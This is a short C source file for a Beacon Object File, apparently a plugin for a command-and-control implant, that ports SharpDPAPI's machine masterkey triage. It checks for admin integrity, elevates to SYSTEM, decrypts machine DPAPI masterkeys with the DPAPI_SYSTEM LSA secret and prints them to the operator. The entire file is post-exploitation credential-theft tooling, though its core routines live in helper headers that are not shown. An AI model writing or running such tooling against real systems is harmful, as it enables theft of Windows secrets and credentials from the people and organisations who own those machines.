/*
 * machinemasterkeys.c — BOF for SYSTEM DPAPI masterkey triage
 *
 * Usage:
 *   machinemasterkeys
 *
 * Elevates to SYSTEM and decrypts machine DPAPI masterkeys
 * using the DPAPI_SYSTEM LSA secret. Requires high integrity.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    (void)args; (void)args_len;

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n=== SharpDPAPI Machine Masterkeys (BOF) ===\n");

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Must run from high integrity (admin) context\n");
        return;
    }

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    BOOL result = triage_system_masterkeys(&cache);

    if (result && cache.count > 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Decrypted %d machine masterkey(s)\n", cache.count);
        mk_cache_print(&cache);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] No machine masterkeys decrypted\n");
    }

    mk_cache_free(&cache);
}
